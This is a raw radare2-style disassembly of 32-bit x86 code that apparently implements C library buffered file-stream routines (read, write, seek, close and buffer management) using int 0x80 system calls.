jmp 0x804cd70
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
sub eax, dword [edx + 0xc]
jmp 0x804ce2b
push ebp
mov ebp, esp
sub esp, 0x18
mov dword [var_4h], esi
mov eax, dword [arg_14h]
mov dword [var_8h], ebx
mov esi, dword [arg_8h]
mov edx, dword [arg_10h]
mov ebx, 0xffffffff
mov ecx, dword [esi + 0x94]
mov dword [esp], esi
mov dword [var_sp_8h], edx
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call dword [ecx + 0x40]
mov ecx, 0xffffffff
test edx, edx
js 0x804ce88
mov dword [esi + 0x4c], eax
mov dword [esi + 0x50], edx
mov ecx, eax
mov ebx, edx
mov edx, ebx
mov esi, dword [var_4h]
mov eax, ecx
mov ebx, dword [var_8h]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_8h]
mov dword [var_4h], ebx
mov ecx, dword [arg_ch]
mov edx, dword [arg_10h]
test byte [eax + 0x3c], 2
jne 0x804ced0
mov dword [var_8h], edx
mov dword [var_sp_4h], ecx
mov eax, dword [eax + 0x38]
mov dword [esp], eax
call fcn.08053f70
mov ebx, dword [var_4h]
leave
ret
mov ebx, dword [eax + 0x38]
mov eax, 3
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804cee7
mov eax, ebx
jmp 0x804cecb
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804cee3
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x38]
mov dword [arg_8h], eax
leave
jmp fcn.08054840
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov eax, dword [arg_ch]
mov dword [var_8h], eax
mov eax, dword [arg_8h]
mov eax, dword [eax + 0x38]
mov dword [esp], 3
mov dword [var_4h], eax
call fcn.08053dc0
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x1c]
mov eax, dword [ebx + 0x20]
sub eax, edx
mov dword [esp], edx
mov dword [var_sp_4h], eax
call fcn.08054780
mov dword [ebx + 0x1c], 0
mov dword [ebx + 0x20], 0
mov ebx, dword [ebx + 0x38]
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804cf98
mov eax, ebx
mov ebx, dword [var_4h]
leave
ret
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804cf91
nop
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ebx, dword [eax + 0x38]
mov eax, 6
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804cfd1
mov eax, ebx
mov ebx, dword [esp]
leave
ret
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804cfca
jmp fcn.0804cff0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov esi, dword [arg_10h]
mov edi, dword [arg_ch]
test esi, esi
jle 0x804d02e
mov eax, dword [arg_8h]
test byte [eax + 0x3c], 2
jne 0x804d062
mov edx, dword [arg_8h]
mov dword [var_8h], esi
mov dword [var_4h], edi
mov eax, dword [edx + 0x38]
mov dword [esp], eax
call fcn.08053fd0
test eax, eax
js 0x804d05a
sub esi, eax
add edi, eax
test esi, esi
jg 0x804d003
mov eax, dword [arg_8h]
sub dword [arg_10h], esi
mov ebx, dword [eax + 0x50]
mov ecx, dword [eax + 0x4c]
test ebx, ebx
js 0x804d04f
mov eax, dword [arg_10h]
cdq
add ecx, eax
adc ebx, edx
mov edx, dword [arg_8h]
mov dword [edx + 0x4c], ecx
mov dword [edx + 0x50], ebx
mov eax, dword [arg_10h]
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [arg_8h]
or dword [ecx], 0x20
jmp 0x804d02e
mov ebx, dword [eax + 0x38]
mov ecx, edi
mov edx, esi
mov eax, 4
int 0x80
cmp eax, 0xfffff000
mov ebx, eax
ja 0x804d07d
mov eax, ebx
jmp 0x804d022
neg ebx
call fcn.08048b20
mov dword [eax], ebx
mov ebx, 0xffffffff
jmp 0x804d079
lea esi, [esi]
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov dword [ebp - 0x10], 0
mov edi, dword [ebp + 0x10]
mov esi, dword [ebp + 0xc]
test edi, edi
je 0x804d10a
mov eax, dword [ebp + 8]
mov ebx, dword [eax + 0x18]
mov edx, dword [eax + 0x14]
mov ecx, eax
mov eax, dword [eax]
sub ebx, edx
and eax, 0xa00
cmp eax, 0xa00
je 0x804d1b8
test ebx, ebx
je 0x804d0fb
cmp ebx, dword [ebp + 0x10]
cmova ebx, dword [ebp + 0x10]
cmp ebx, 0x14
ja 0x804d195
mov ecx, edx
mov edx, ebx
dec edx
js 0x804d0f0
movzx eax, byte [esi]
inc esi
mov byte [ecx], al
inc ecx
dec edx
jns 0x804d0e6
mov eax, dword [ebp + 8]
mov dword [eax + 0x14], ecx
mov edi, dword [ebp + 0x10]
sub edi, ebx
mov edx, dword [ebp - 0x10]
lea eax, [edx + edi]
test eax, eax
jne 0x804d112
mov eax, dword [ebp + 0x10]
sub eax, edi
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
mov ecx, dword [ebp + 8]
mov eax, dword [ecx + 0x94]
mov dword [esp], ecx
mov dword [esp + 4], 0xffffffff
call dword [eax + 0xc]
inc eax
je 0x804d105
mov eax, dword [ebp + 8]
mov dword [ebp - 0x14], edi
mov ecx, dword [eax + 0x20]
sub ecx, dword [eax + 0x1c]
cmp ecx, 0x7f
jbe 0x804d14a
mov eax, edi
xor edx, edx
div ecx
mov ecx, edi
sub ecx, edx
mov dword [ebp - 0x14], ecx
mov ecx, dword [ebp - 0x14]
test ecx, ecx
jne 0x804d172
test edi, edi
je 0x804d105
mov ecx, dword [ebp - 0x14]
mov dword [esp + 8], edi
lea eax, [ecx + esi]
mov dword [esp + 4], eax
mov eax, dword [ebp + 8]
mov dword [esp], eax
call fcn.0804dc60
sub edi, eax
jmp 0x804d105
mov eax, dword [ebp - 0x14]
mov edx, dword [ebp + 8]
mov dword [esp + 4], esi
mov dword [esp + 8], eax
mov dword [esp], edx
call fcn.0804bdd0
sub edi, eax
cmp eax, dword [ebp - 0x14]
jb 0x804d105
jmp 0x804d151
mov eax, dword [ebp + 0xc]
mov dword [esp], edx
mov dword [esp + 8], ebx
mov dword [esp + 4], eax
call fcn.08053740
mov esi, dword [ebp + 0xc]
mov edx, dword [ebp + 8]
add esi, ebx
mov dword [edx + 0x14], eax
jmp 0x804d0f6
mov ebx, dword [ecx + 0x20]
sub ebx, edx
cmp ebx, dword [ebp + 0x10]
jb 0x804d0cb
mov ecx, dword [ebp + 0x10]
lea eax, [ecx + esi]
cmp eax, esi
jbe 0x804d0cb
dec eax
cmp byte [eax], 0xa
je 0x804d1e4
cmp eax, dword [ebp + 0xc]
ja 0x804d1d4
jmp 0x804d0cb
sub eax, dword [ebp + 0xc]
mov dword [ebp - 0x10], 1
lea ebx, [eax + 1]
jmp 0x804d0cb
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x14
mov edx, dword [arg_10h]
mov eax, dword [arg_ch]
mov edi, dword [arg_8h]
mov dword [var_14h], eax
mov dword [var_10h], edx
mov eax, dword [edi + 0x1c]
test eax, eax
jne 0x804d232
mov eax, dword [edi + 0x24]
test eax, eax
jne 0x804d365
mov dword [esp], edi
call fcn.0804dbb0
mov esi, dword [arg_10h]
test esi, esi
je 0x804d2eb
lea esi, [esi]
mov ebx, dword [edi + 8]
mov eax, dword [edi + 4]
sub ebx, eax
cmp dword [var_10h], ebx
jbe 0x804d340
test ebx, ebx
jne 0x804d31f
test byte [edi + 1], 1
jne 0x804d315
mov edx, dword [edi + 0x1c]
test edx, edx
je 0x804d278
mov eax, dword [edi + 0x20]
sub eax, edx
cmp dword [var_10h], eax
jb 0x804d308
test edx, edx
mov dword [edi + 0xc], edx
mov dword [edi + 4], edx
mov dword [edi + 8], edx
mov dword [edi + 0x14], edx
mov dword [edi + 0x10], edx
mov dword [edi + 0x18], edx
mov esi, dword [var_10h]
je 0x804d2a3
mov ecx, dword [edi + 0x20]
sub ecx, edx
cmp ecx, 0x7f
jbe 0x804d2a3
mov eax, esi
xor edx, edx
div ecx
sub esi, edx
mov eax, dword [edi + 0x94]
mov edx, dword [var_14h]
mov dword [esp], edi
mov dword [var_8h], esi
mov dword [var_4h], edx
call dword [eax + 0x38]
test eax, eax
mov esi, eax
jle 0x804d2fc
mov ecx, dword [edi + 0x4c]
mov ebx, dword [edi + 0x50]
add dword [var_14h], eax
sub dword [var_10h], eax
mov eax, ecx
and eax, ebx
inc eax
je 0x804d2e0
mov eax, esi
cdq
add ecx, esi
adc ebx, edx
mov dword [edi + 0x4c], ecx
mov dword [edi + 0x50], ebx
mov ebx, dword [var_10h]
test ebx, ebx
jne 0x804d240
mov eax, dword [var_10h]
sub dword [arg_10h], eax
mov eax, dword [arg_10h]
add esp, 0x14
pop ebx
pop esi
pop edi
leave
ret
jne 0x804d303
or dword [edi], 0x10
jmp 0x804d2eb
or dword [edi], 0x20
jmp 0x804d2eb
mov dword [esp], edi
call fcn.0804d9e0
inc eax
jne 0x804d2e0
jmp 0x804d2eb
mov dword [esp], edi
call fcn.0804d710
jmp 0x804d2e0
mov dword [var_4h], eax
mov dword [var_8h], ebx
mov eax, dword [var_14h]
mov dword [esp], eax
call fcn.08053740
add dword [edi + 4], ebx
mov dword [var_14h], eax
sub dword [var_10h], ebx
jmp 0x804d259
mov edx, dword [var_10h]
mov dword [var_4h], eax
mov eax, dword [var_14h]
mov dword [var_8h], edx
mov dword [esp], eax
call fcn.08053770
mov edx, dword [var_10h]
mov dword [var_10h], 0
add dword [edi + 4], edx
jmp 0x804d2eb
mov dword [esp], eax
call fcn.08051180
and dword [edi], 0xfffffeff
jmp 0x804d22a
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x1c
mov eax, dword [arg_8h]
mov dword [var_4h], edi
mov dword [var_ch], ebx
mov dword [var_8h], esi
mov edi, dword [arg_10h]
mov edx, dword [arg_ch]
mov esi, dword [eax + 4]
mov ebx, dword [eax + 8]
mov dword [var_10h], edx
sub ebx, esi
cmp ebx, edi
jae 0x804d3b5
test byte [eax + 1], 1
jne 0x804d439
cmp ebx, edi
jb 0x804d3ee
test ebx, ebx
je 0x804d3dd
mov edx, dword [var_10h]
cmp edi, ebx
mov dword [var_sp_4h], esi
cmovbe ebx, edi
mov dword [var_sp_8h], ebx
lea ebx, [ebx + esi]
mov dword [esp], edx
call fcn.08053740
mov dword [var_10h], eax
mov eax, dword [arg_8h]
mov dword [eax + 4], ebx
mov eax, dword [var_10h]
sub eax, dword [arg_ch]
mov ebx, dword [var_ch]
mov esi, dword [var_8h]
mov edi, dword [var_4h]
leave
ret
mov edx, dword [arg_8h]
mov dword [esp], edx
call fcn.0804c060
test eax, eax
jne 0x804d411
mov eax, dword [arg_8h]
mov esi, dword [eax + 4]
mov ebx, dword [eax + 8]
sub ebx, esi
cmp ebx, edi
jae 0x804d3b5
or dword [eax], 0x10
jmp 0x804d3b5
mov edx, dword [arg_8h]
mov eax, dword [arg_ch]
sub dword [var_10h], eax
mov eax, dword [edx + 0x94]
mov edx, dword [arg_ch]
mov dword [var_sp_8h], edi
mov dword [var_sp_4h], edx
mov edx, dword [arg_8h]
mov dword [esp], edx
call dword [eax + 0x20]
add eax, dword [var_10h]
jmp 0x804d3e3
mov dword [var_sp_8h], ebx
mov dword [var_sp_4h], esi
mov dword [esp], edx
call fcn.08053740
sub edi, ebx
mov edx, dword [arg_8h]
mov dword [var_10h], eax
mov dword [esp], edx
call fcn.0804d710
mov eax, dword [arg_8h]
mov esi, dword [eax + 4]
mov ebx, dword [eax + 8]
sub ebx, esi
jmp 0x804d3b1
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov dword [esp], ebx
call fcn.0804c3d0
mov eax, dword [arg_10h]
mov edx, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_sp_4h], eax
call dword [edx + 0x20]
mov ebx, dword [var_4h]
leave
ret
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 4
mov eax, dword [0x80aa32c]
test eax, eax
je 0x804d4d5
cmp word [eax], 0
jns 0x804d4ed
mov eax, 0
test eax, eax
je 0x804d4eb
mov dword [arg_8h], 0x80a9058
leave
jmp section.
leave
ret
mov dword [esp], eax
call fcn.08074580
jmp 0x804d4d5
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
push esi
push ebx
sub esp, 0x1c
mov ebx, dword [arg_8h]
cmp byte [ebx], 0
jns 0x804d59f
mov eax, 0
test eax, eax
setne al
movzx esi, al
test esi, esi
jne 0x804d5df
mov eax, 0
test eax, eax
je 0x804d53e
mov dword [esp], 0x80a9058
call section.
cmp word [ebx], 0
mov dword [0x80aa32c], ebx
jns 0x804d5d2
mov ecx, dword [0x80a94f8]
mov edx, 0x80a94f8
test ecx, ecx
je 0x804d570
lea esi, [esi]
mov eax, dword [edx]
cmp eax, ebx
je 0x804d5c5
lea edx, [eax + 0x34]
mov eax, dword [eax + 0x34]
test eax, eax
jne 0x804d560
and dword [ebx], 0xffffff7f
cmp word [ebx], 0
jns 0x804d5bb
mov eax, 0
mov dword [0x80aa32c], 0
test eax, eax
je 0x804d59b
mov dword [esp], 0x80a9058
call section.
test esi, esi
jne 0x804d5a6
add esp, 0x1c
pop ebx
pop esi
leave
ret
lea eax, [var_18h]
mov dword [var_4h], 0
mov dword [esp], eax
call section.
jmp 0x804d59f
mov dword [esp], ebx
call fcn.08074580
jmp 0x804d57c
inc dword [0x80aa328]
mov eax, dword [ebx + 0x34]
mov dword [edx], eax
jmp 0x804d570
mov dword [esp], ebx
call fcn.08074540
jmp 0x804d54e
lea eax, [var_18h]
mov dword [var_8h], 0
mov dword [var_4h], fcn.0804d4c0
mov dword [esp], eax
call section.
jmp 0x804d529
nop
push ebp
mov ebp, esp
sub esp, 0x24
mov dword [var_8h], ebx
mov dword [var_4h], esi
mov ebx, dword [arg_8h]
cmp byte [ebx], 0
js 0x804d68d
mov eax, 0
or dword [ebx], 0x80
test eax, eax
setne al
movzx esi, al
test esi, esi
jne 0x804d6c0
mov eax, 0
test eax, eax
je 0x804d644
mov dword [esp], 0x80a9058
call section.
cmp word [ebx], 0
mov dword [0x80aa32c], ebx
jns 0x804d6b4
inc dword [0x80aa328]
mov eax, dword [0x80a94f8]
mov dword [0x80a94f8], ebx
cmp word [ebx], 0
mov dword [ebx + 0x34], eax
jns 0x804d6aa
mov eax, 0
mov dword [0x80aa32c], 0
test eax, eax
je 0x804d689
mov dword [esp], 0x80a9058
call section.
test esi, esi
jne 0x804d695
mov ebx, dword [var_8h]
mov esi, dword [var_4h]
leave
ret
lea eax, [var_18h]
mov dword [var_sp_4h], 0
mov dword [esp], eax
call section.
jmp 0x804d68d
mov dword [esp], ebx
call fcn.08074580
jmp 0x804d66a
mov dword [esp], ebx
call fcn.08074540
jmp 0x804d650
mov esi, esi
lea eax, [var_18h]
mov dword [var_sp_8h], 0
mov dword [var_sp_4h], fcn.0804d4c0
mov dword [esp], eax
call section.
jmp 0x804d62f
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov ecx, dword [arg_ch]
mov edx, dword [eax + 0x30]
sub ecx, dword [eax + 0xc]
test edx, edx
je 0x804d701
mov eax, dword [edx + 8]
mov edx, dword [edx]
cmp eax, ecx
cmovl ecx, eax
test edx, edx
jne 0x804d6f3
mov eax, ecx
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
mov eax, dword [arg_8h]
mov ecx, dword [eax + 8]
mov edx, dword [eax + 0x2c]
and dword [eax], 0xfffffeff
mov dword [eax + 8], edx
mov dword [eax + 0x2c], ecx
mov edx, dword [eax + 0x24]
mov ecx, dword [eax + 0xc]
mov dword [eax + 4], edx
mov dword [eax + 0xc], edx
mov dword [eax + 0x24], ecx
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push ebx
mov eax, dword [arg_8h]
mov ebx, dword [eax + 8]
mov ecx, dword [eax + 0x2c]
mov edx, dword [eax + 0x24]
or dword [eax], 0x100
mov dword [eax + 0x2c], ebx
mov dword [eax + 8], ecx
mov dword [eax + 4], ecx
mov ebx, dword [eax + 0xc]
mov dword [eax + 0xc], edx
mov dword [eax + 0x24], ebx
mov ebx, dword [esp]
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov edx, dword [ebx + 0x14]
cmp edx, dword [ebx + 0x10]
ja 0x804d7c0
mov ecx, dword [ebx]
test ch, 1
je 0x804d7ab
mov eax, dword [ebx + 0x28]
mov dword [ebx + 0xc], eax
and ch, 0xf7
mov dword [ebx + 4], edx
mov dword [ebx + 0x18], edx
mov dword [ebx + 0x14], edx
mov dword [ebx + 0x10], edx
mov dword [ebx], ecx
xor edx, edx
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
cmp edx, dword [ebx + 8]
mov eax, dword [ebx + 0x1c]
mov dword [ebx + 0xc], eax
jbe 0x804d791
mov dword [ebx + 8], edx
jmp 0x804d791
nop
lea esi, [esi]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
mov dword [var_sp_4h], 0xffffffff
call dword [eax + 0xc]
mov edx, 0xffffffff
inc eax
je 0x804d7a4
mov edx, dword [ebx + 0x14]
jmp 0x804d784
jmp fcn.0804d7f0
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
test byte [ebx + 1], 1
jne 0x804d827
mov eax, dword [ebx + 0x24]
mov dword [esp], eax
call fcn.08051180
mov dword [ebx + 0x24], 0
mov dword [ebx + 0x2c], 0
mov dword [ebx + 0x28], 0
mov ebx, dword [var_4h]
leave
ret
mov dword [esp], ebx
call fcn.0804d710
jmp 0x804d802
jmp fcn.0804d840
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
sub esp, 8
mov ecx, dword [arg_8h]
mov eax, dword [ecx + 0x5c]
test eax, eax
jne 0x804d857
mov dword [ecx + 0x5c], 0xffffffff
mov eax, dword [ecx + 0x94]
mov edx, dword [arg_ch]
mov dword [esp], ecx
mov dword [var_4h], edx
call dword [eax + 0xc]
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
mov ebx, eax
sub esp, 0x20
mov dword [var_10h], edx
mov dword [var_4h], edx
mov dword [esp], eax
call fcn.0804d6e0
mov ecx, dword [ebx + 0xc]
mov esi, dword [var_10h]
mov edi, eax
mov edx, dword [ebx + 0x24]
sub esi, ecx
sub esi, eax
mov eax, dword [ebx + 0x2c]
mov dword [var_14h], eax
sub eax, edx
cmp esi, eax
ja 0x804d939
sub eax, esi
test edi, edi
mov dword [var_18h], eax
js 0x804d901
test esi, esi
jne 0x804d8e3
mov esi, dword [var_18h]
lea eax, [esi + edx]
mov edx, dword [var_10h]
mov dword [ebx + 0x28], eax
mov eax, dword [ebx + 0x30]
sub edx, ecx
test eax, eax
je 0x804d8d9
nop
lea esi, [esi]
sub dword [eax + 8], edx
mov eax, dword [eax]
test eax, eax
jne 0x804d8d0
xor eax, eax
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
lea eax, [edi + ecx]
add edx, dword [var_18h]
mov dword [var_8h], esi
mov dword [var_4h], eax
mov dword [esp], edx
call fcn.08053770
mov edx, dword [ebx + 0x24]
mov ecx, dword [ebx + 0xc]
jmp 0x804d8b6
mov eax, edi
mov esi, dword [var_18h]
neg eax
mov dword [var_8h], eax
mov eax, dword [var_14h]
add eax, edi
mov dword [var_4h], eax
lea eax, [esi + edx]
mov dword [esp], eax
call fcn.08053690
mov eax, dword [var_10h]
mov edx, esi
mov ecx, dword [ebx + 0xc]
add edx, dword [ebx + 0x24]
sub eax, ecx
mov dword [var_4h], ecx
sub edx, edi
mov dword [var_8h], eax
jmp 0x804d8f1
lea eax, [esi + 0x64]
mov dword [var_18h], 0x64
mov dword [esp], eax
call fcn.08050fe0
mov dword [var_1ch], eax
mov edx, dword [var_1ch]
mov eax, 0xffffffff
test edx, edx
je 0x804d8db
test edi, edi
js 0x804d9a4
mov eax, dword [var_1ch]
add edi, dword [ebx + 0xc]
mov dword [var_8h], esi
add eax, 0x64
mov dword [var_20h], eax
mov dword [var_4h], edi
mov dword [esp], eax
call fcn.08053770
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x804d99a
mov ecx, dword [var_1ch]
mov eax, dword [var_20h]
mov edx, dword [var_1ch]
mov dword [ebx + 0x24], ecx
add eax, esi
mov ecx, dword [ebx + 0xc]
mov dword [ebx + 0x2c], eax
jmp 0x804d8b6
mov dword [esp], eax
call fcn.08051180
jmp 0x804d981
mov ecx, dword [var_1ch]
mov eax, edi
add edi, dword [ebx + 0x2c]
neg eax
mov dword [var_8h], eax
add ecx, 0x64
mov dword [var_20h], ecx
mov dword [esp], ecx
mov dword [var_4h], edi
call fcn.08053740
mov edx, dword [var_10h]
mov ecx, dword [ebx + 0xc]
mov dword [esp], eax
sub edx, ecx
mov dword [var_4h], ecx
mov dword [var_8h], edx
call fcn.08053740
jmp 0x804d97a
mov esi, esi
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x804d9ff
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
mov edx, 0xffffffff
jne 0x804da39
test byte [ebx + 1], 8
jne 0x804da75
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jb 0x804da70
test byte [ebx + 1], 1
jne 0x804da5c
mov eax, dword [ebx + 0x30]
test eax, eax
jne 0x804da4a
mov ecx, dword [ebx + 0x24]
test ecx, ecx
jne 0x804da40
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.0804d7f0
jmp 0x804da2b
mov eax, ebx
call fcn.0804d870
mov edx, 0xffffffff
test eax, eax
je 0x804da2b
jmp 0x804da39
mov dword [esp], ebx
call fcn.0804d710
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jae 0x804da1d
mov esi, esi
movzx edx, byte [eax]
jmp 0x804da39
mov dword [esp], ebx
call fcn.0804d770
mov edx, 0xffffffff
inc eax
jne 0x804da0d
jmp 0x804da39
mov esi, esi
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x5c]
test eax, eax
jne 0x804daaf
mov dword [ebx + 0x5c], 0xffffffff
mov eax, 0xffffffff
inc eax
mov edx, 0xffffffff
jne 0x804dae9
test byte [ebx + 1], 8
jne 0x804db2d
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jb 0x804db24
test byte [ebx + 1], 1
jne 0x804db12
mov eax, dword [ebx + 0x30]
test eax, eax
jne 0x804db00
mov eax, dword [ebx + 0x24]
test eax, eax
jne 0x804daf0
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x14]
mov edx, eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
mov dword [esp], ebx
call fcn.0804d7f0
jmp 0x804dadb
lea esi, [esi]
mov eax, ebx
call fcn.0804d870
mov edx, 0xffffffff
test eax, eax
je 0x804dadb
jmp 0x804dae9
mov dword [esp], ebx
call fcn.0804d710
mov eax, dword [ebx + 4]
mov edx, dword [ebx + 8]
cmp eax, edx
jae 0x804dacd
movzx edx, byte [eax]
inc eax
mov dword [ebx + 4], eax
jmp 0x804dae9
mov dword [esp], ebx
call fcn.0804d770
mov edx, 0xffffffff
inc eax
jne 0x804dabd
jmp 0x804dae9
nop
push ebp
mov ebp, esp
sub esp, 0xc
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov ecx, dword [ebx + 0x1c]
test ecx, ecx
je 0x804dba0
mov edx, dword [ebx]
test dl, 1
je 0x804db80
mov eax, dword [arg_ch]
mov dword [ebx + 0x1c], eax
mov eax, dword [arg_10h]
mov dword [ebx + 0x20], eax
mov eax, dword [arg_14h]
test eax, eax
je 0x804db77
and edx, 0xfffffffe
mov dword [ebx], edx
mov ebx, dword [var_4h]
leave
ret
or edx, 1
jmp 0x804db70
lea esi, [esi]
mov eax, dword [ebx + 0x20]
mov dword [esp], ecx
sub eax, ecx
add eax, 0xfff
and eax, 0xfffff000
mov dword [var_sp_4h], eax
call fcn.08054780
nop
lea esi, [esi]
mov edx, dword [ebx]
jmp 0x804db5a
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
sub esp, 0x14
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x1c]
test eax, eax
jne 0x804dbe0
test byte [ebx], 2
je 0x804dbcf
mov eax, dword [ebx + 0x5c]
test eax, eax
jle 0x804dbe5
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x34]
inc eax
je 0x804dbe5
mov esi, esi
mov ebx, dword [var_4h]
leave
ret
lea eax, [ebx + 0x48]
mov dword [var_ch], 0
mov dword [esp], ebx
mov dword [var_8h], eax
lea eax, [ebx + 0x47]
mov dword [var_sp_4h], eax
call fcn.0804db40
jmp 0x804dbe0
lea esi, [esi]
lea edi, [edi]
push ebp
mov eax, 0xffffffff
mov ebp, esp
leave
ret
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 8
mov dword [var_4h], ebx
mov ebx, dword [arg_8h]
mov eax, dword [ebx + 0x94]
mov dword [esp], ebx
call dword [eax + 0x10]
mov edx, 0xffffffff
inc eax
je 0x804dc4a
mov eax, dword [ebx + 4]
movzx edx, byte [eax]
inc eax
mov dword [ebx + 4], eax
mov ebx, dword [var_4h]
mov eax, edx
leave
ret
jmp fcn.0804dc60
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
push ebp
xor eax, eax
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov edi, dword [arg_10h]
mov ebx, dword [arg_ch]
test edi, edi
je 0x804dcdb
mov eax, dword [arg_8h]
mov edx, dword [eax + 0x14]
mov eax, dword [eax + 0x18]
cmp edx, eax
jae 0x804dcb2
mov esi, eax
sub esi, edx
cmp esi, edi
cmova esi, edi
cmp esi, 0x14
ja 0x804dce3
test esi, esi
je 0x804dcb0
mov ecx, edx
mov edx, esi
dec edx
js 0x804dcaa
nop
lea esi, [esi]
movzx eax, byte [ebx]
inc ebx
mov byte [ecx], al
inc ecx
dec edx
jns 0x804dca0
mov eax, dword [arg_8h]
mov dword [eax + 0x14], ecx
sub edi, esi
test edi, edi
je 0x804dcd6
mov edx, dword [arg_8h]
mov ecx, dword [arg_8h]
mov eax, dword [edx + 0x94]
movzx edx, byte [ebx]
mov dword [esp], ecx
inc ebx
mov dword [var_4h], edx
call dword [eax + 0xc]
inc eax
je 0x804dcd6
dec edi
jmp 0x804dc75
mov eax, dword [arg_10h]
sub eax, edi
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov dword [var_4h], ebx
mov dword [esp], edx
mov dword [var_8h], esi
call fcn.08053740
add ebx, esi
mov edx, dword [arg_8h]
mov dword [edx + 0x14], eax
jmp 0x804dcb0
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0xc
mov edx, dword [arg_8h]
mov eax, dword [arg_10h]
mov ecx, dword [edx + 0x94]
mov dword [esp], edx
mov dword [var_8h], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
call dword [ecx + 0x20]
leave
ret
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0xc
mov esi, dword [arg_ch]
mov edi, dword [arg_10h]
nop
mov edx, dword [arg_8h]
mov eax, dword [edx + 4]
mov edx, dword [edx + 8]
cmp eax, edx
jae 0x804dd78
mov ebx, edx
sub ebx, eax
cmp ebx, edi
cmova ebx, edi
cmp ebx, 0x14
ja 0x804dd98
test ebx, ebx
je 0x804dd76
mov edx, ebx
mov ecx, eax
dec edx
js 0x804dd70
movzx eax, byte [ecx]
inc ecx
mov byte [esi], al
inc esi
dec edx
jns 0x804dd66
mov edx, dword [arg_8h]
mov dword [edx + 4], ecx
sub edi, ebx
test edi, edi
je 0x804dd8a
mov ecx, dword [arg_8h]
mov dword [esp], ecx
call fcn.0804d9e0
inc eax
jne 0x804dd40
sub dword [arg_10h], edi
mov eax, dword [arg_10h]
add esp, 0xc
pop ebx
pop esi
pop edi
leave
ret
mov dword [esp], esi
mov dword [var_8h], ebx
mov dword [var_4h], eax
call fcn.08053740
mov esi, eax
mov eax, dword [arg_8h]
add dword [eax + 4], ebx
jmp 0x804dd76
